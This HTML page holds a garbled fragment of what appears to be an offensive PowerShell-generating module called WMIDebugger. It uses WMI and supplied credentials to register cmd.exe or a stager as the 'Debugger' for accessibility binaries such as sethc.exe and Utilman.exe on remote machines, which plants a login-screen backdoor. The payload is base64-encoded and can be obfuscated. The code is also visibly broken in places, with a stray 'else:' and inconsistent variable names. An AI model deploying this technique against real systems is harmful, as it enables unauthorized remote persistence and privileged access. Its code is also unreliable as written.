<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>WMIDebugger</title>
</head><body>Uses WMI to set the debugger for a target binary on a remote machine to be cmd.exe or a stager.<br/>
Does not need Admin<br/>
<br/>
Target binary to set the debugger for (sethc.exe, Utilman.exe, osk.exe, Narrator.exe, or Magnify.exe)<br/>
<br/>
Script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""<br/>
else:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; payloadCode = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+binary+"';"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; statusMsg += " to set the debugger for "+targetBinary+" to be " + binary + "."<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # unicode-base64 the payload code to execute on the targets with -enc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; encPayload = helpers.enc_powershell(payloadCode)<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # build the WMI execution string<br/>
&nbsp; &nbsp; &nbsp; &nbsp; computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script += " -ComputerName @("+computerNames+")"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload + "\""<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # if we're supplying alternate user credentials<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if userName != '':<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script += ";'Invoke-Wmi executed on " +computerNames + statusMsg+"'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if obfuscate:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return script<br/>
</body></html>